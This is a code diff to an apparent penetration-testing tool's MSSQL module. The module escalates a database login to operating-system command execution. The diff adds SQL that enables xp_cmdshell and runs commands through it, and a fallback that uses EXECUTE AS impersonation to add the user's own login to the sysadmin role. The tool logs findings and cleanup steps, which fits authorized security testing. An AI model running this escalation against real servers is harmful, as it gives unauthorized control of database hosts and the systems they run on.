@@ -28,6 +28,12 @@ _IMPERSONATE = ("SELECT 'FK:'+b.name FROM sys.server_permissions a "
                 "JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id "
                 "WHERE a.permission_name='IMPERSONATE'")
 _LINKED = "SELECT 'FK:'+name FROM sys.servers WHERE is_linked=1 AND is_rpc_out_enabled=1"
+# xp_cmdshell capability — being sysadmin is ONE way to run it, but a login granted
+# EXECUTE (or one where it's already enabled) can too. Enable (best-effort) then test.
+_XP_ENABLE = ("EXEC sp_configure 'show advanced options',1;RECONFIGURE;"
+              "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE")
+_XP_TEST = "EXEC master..xp_cmdshell 'echo FK:XPOK'"
+_XP_DISABLE = "EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE"
 
 
 def _as_login(login, inner):
@@ -47,19 +53,23 @@ def _fk(output):
 @dataclass
 class MssqlReport:
     host: str
-    status: str = "none"          # already_sysadmin|escalated|gated|linked_only|none|failed|aborted
-    via: str = None               # the impersonated login, when escalated
+    status: str = "none"     # xpcmd|escalated|already_sysadmin|gated|linked_only|none|failed|aborted
+    via: str = None               # the impersonated login, when escalated via impersonation
     impersonatable: list = field(default_factory=list)   # sysadmin logins we can impersonate
     linked: list = field(default_factory=list)           # linked servers (rpc-out)
     aborted: str = None
 
 
 def escalate_privs(store, host, cred, *, run=None, allow_config_change=False, on_event=None):
-    """Enumerate the SQL-layer escalation surface and, when permitted, escalate to sysadmin.
+    """Get from an MSSQL login to OS command execution.
 
-    Reads-only unless ``allow_config_change`` (adding your login to the sysadmin role is a
-    config change). Records a proven finding + captured step + a cleanup artifact and
-    upgrades your MSSQL access to admin when it escalates."""
+    Read-only (no ``allow_config_change``) just enumerates the surface — sysadmin?,
+    impersonatable sysadmin logins, RPC-out linked servers. With ``allow_config_change`` it
+    **tries xp_cmdshell directly first** (enable + run — this works whether you're sysadmin
+    or merely granted xp_cmdshell rights) and only falls back to EXECUTE AS impersonation if
+    that fails. On success it records a proven finding + captured step, upgrades your MSSQL
+    access to admin (so ``enum``/``escalate`` run over xp_cmdshell), and records reversible
+    cleanup (disable xp_cmdshell, drop the role member)."""
     from . import runner as runner_mod
     run = run or (lambda argv, env=None: runner_mod.run(argv, env_add=env))
     cred = cred if isinstance(cred, Credential) else Credential.from_row(cred)
@@ -68,76 +78,98 @@ def escalate_privs(store, host, cred, *, run=None, allow_config_change=False, on
 
     def query(sql):
         rendered = _query_argv(cred, ip, sql)
-        res = run(rendered.argv, rendered.env)
-        return res
+        return run(rendered.argv, rendered.env)
 
     def emit(m):
         if on_event:
             on_event(m)
 
-    # 1) already sysadmin? then there's nothing to escalate here.
+    def xp_works():
+        """Best-effort enable xp_cmdshell, then confirm it runs. Returns (ok, output)."""
+        query(_XP_ENABLE)
+        out = query(_XP_TEST).output or ""
+        return "XPOK" in out, out
+
+    # read-only enumeration first (always safe)
     res = query(_IS_SYSADMIN)
     if res.error:
         rep.aborted = res.error
         return rep
-    if "1" in _fk(res.output):
-        rep.status = "already_sysadmin"
-        return rep
-
-    # 2) who am I, and which logins can I impersonate that are sysadmin?
+    is_sa = "1" in _fk(res.output)
     me = next(iter(_fk(query(_WHOAMI).output)), None) or cred.username
     for login in _fk(query(_IMPERSONATE).output):
         if "1" in _fk(query(_as_login(login, _IS_SYSADMIN)).output):
             rep.impersonatable.append(login)
             emit(f"  impersonatable sysadmin login: {login}")
-
-    # 3) linked servers (surfaced, not auto-exploited)
     rep.linked = _fk(query(_LINKED).output)
     for s in rep.linked:
         emit(f"  linked server (rpc-out): {s}")
 
-    if not rep.impersonatable:
-        rep.status = "linked_only" if rep.linked else "none"
-        _record_linked(store, host, rep)
-        return rep
-
     if not allow_config_change:
-        rep.status = "gated"
+        rep.status = ("already_sysadmin" if is_sa else
+                      "gated" if rep.impersonatable else
+                      "linked_only" if rep.linked else "none")
         _record_linked(store, host, rep)
         return rep
 
-    # 4) escalate: impersonate the sysadmin login and add my own login to the sysadmin role.
-    login = rep.impersonatable[0]
-    grant = _as_login(login, f"EXEC sp_addsrvrolemember '{me}','sysadmin'")
-    emit(f"  escalating: EXECUTE AS {login} → add {me} to sysadmin")
-    query(grant)
-    verify = query(_IS_SYSADMIN)
-    if "1" not in _fk(verify.output):
+    # 1) xp_cmdshell directly — you don't need to be sysadmin, just able to run it.
+    emit("  testing xp_cmdshell (enable + echo)…")
+    ok, out = xp_works()
+    if ok:
+        rep.status = "xpcmd"
+        _establish_exec(
+            store, host, cred, ip, proof=out,
+            report_type="mssql_xpcmdshell",
+            title=f"MSSQL xp_cmdshell → OS command execution ({'sysadmin' if is_sa else me})",
+            evidence=f"{me} can enable and run xp_cmdshell (verified `echo FK:XPOK`) — OS "
+                     "command execution as the SQL Server service account.",
+            cleanups=[(f"enabled xp_cmdshell on {ip}",
+                       f'nxc mssql {ip} … -q "{_XP_DISABLE}"')])
+        _record_linked(store, host, rep)
+        return rep
+
+    # 2) can't run it directly → impersonate a sysadmin, grant self sysadmin, retry.
+    if rep.impersonatable:
+        login = rep.impersonatable[0]
+        emit(f"  escalating: EXECUTE AS {login} → add {me} to sysadmin, then xp_cmdshell")
+        query(_as_login(login, f"EXEC sp_addsrvrolemember '{me}','sysadmin'"))
+        ok, out = xp_works()
+        if ok:
+            rep.status = "escalated"
+            rep.via = login
+            drop = _as_login(login, f"EXEC sp_dropsrvrolemember '{me}','sysadmin'")
+            _establish_exec(
+                store, host, cred, ip, proof=out,
+                report_type="mssql_impersonation",
+                title=f"MSSQL EXECUTE AS impersonation ({login}) → sysadmin → xp_cmdshell",
+                evidence=f"{me} holds IMPERSONATE on sysadmin login {login}; added {me} to "
+                         "the sysadmin role and enabled xp_cmdshell (verified).",
+                cleanups=[(f"added {me} to the MSSQL sysadmin role on {ip}",
+                           f'nxc mssql {ip} … -q "{drop}"'),
+                          (f"enabled xp_cmdshell on {ip}",
+                           f'nxc mssql {ip} … -q "{_XP_DISABLE}"')])
+            _record_linked(store, host, rep)
+            return rep
         rep.status = "failed"
         return rep
 
-    rep.status = "escalated"
-    rep.via = login
-    drop = _as_login(login, f"EXEC sp_dropsrvrolemember '{me}','sysadmin'")
-    with store.transaction():
-        fid, _ = store.add_finding(
-            "mssql_impersonation",
-            f"MSSQL EXECUTE AS impersonation ({login}) → sysadmin", host_id=host["id"],
-            proven=True,
-            evidence=f"{me} holds IMPERSONATE on sysadmin login {login}; added {me} to the "
-                     "sysadmin role (verified IS_SRVROLEMEMBER('sysadmin')=1).")
-        step_id = store.add_step(
-            cmd=f"nxc mssql {ip} ... -q \"{grant}\"", output=verify.output or "FK:1",
-            host_id=host["id"], finding_id=fid, transport="mssql")
-        _ = step_id
-        # you are now genuinely sysadmin — the plain xp_cmdshell path works.
-        store.add_access(host["id"], _cred_id(store, cred), "mssql", admin=True)
-        store.add_artifact(
-            f"added {me} to the MSSQL sysadmin role on {ip}",
-            cleanup_cmd=f"nxc mssql {ip} ... -q \"{drop}\"",
-            host_id=host["id"], finding_id=fid)
+    rep.status = "linked_only" if rep.linked else "none"
     _record_linked(store, host, rep)
     return rep
+
+
+def _establish_exec(store, host, cred, ip, *, proof, report_type, title, evidence, cleanups):
+    """Record the proven OS-exec finding, upgrade the MSSQL access to admin (so enum/escalate
+    run over xp_cmdshell), and record the reversible cleanup(s)."""
+    with store.transaction():
+        fid, _ = store.add_finding(report_type, title, host_id=host["id"],
+                                   proven=True, evidence=evidence)
+        store.add_step(cmd=f'nxc mssql {ip} … -q "{_XP_TEST}"',
+                       output=(proof or "FK:XPOK").strip(), host_id=host["id"],
+                       finding_id=fid, transport="mssql")
+        store.add_access(host["id"], _cred_id(store, cred), "mssql", admin=True)
+        for desc, cmd in cleanups:
+            store.add_artifact(desc, cleanup_cmd=cmd, host_id=host["id"], finding_id=fid)
 
 
 def _record_linked(store, host, rep):
